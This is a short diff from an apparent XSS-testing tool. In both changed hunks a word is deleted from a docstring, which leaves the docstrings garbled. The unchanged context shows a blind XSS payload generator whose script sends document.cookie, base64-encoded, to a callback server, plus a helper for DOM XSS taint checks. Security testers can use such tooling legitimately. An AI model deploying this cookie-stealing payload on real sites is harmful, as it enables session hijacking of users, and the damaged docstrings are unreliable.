@@ -242,7 +242,7 @@ class BlindXSSCallbackServer:
             await self.server.serve_forever()
 
     def get_payload(self, unique_id: str) -> str:
-        """Generates a blind XSS payload pointing to this server."""
+        """ a blind XSS payload pointing to this server."""
         domain = f"http://{self.host}:{self.port}/{unique_id}"
         return f"<script>new Image().src='{domain}?c='+btoa(document.cookie);</script>"
 
@@ -365,7 +365,7 @@ class DomXssAnalyzer:
                 self.vulnerabilities.append(vuln)
     
     def _get_source_check(self, var_name: str) -> str:
-        """Helper to generate JS code that checks if a variable contains tainted data."""
+        """Helper to  JS code that checks if a variable contains tainted data."""
         return " || ".join([f"{var_name}.includes(source)" for source in self.SOURCES])
 
 # ─────────────────────────────────────────────────────────────────────────────
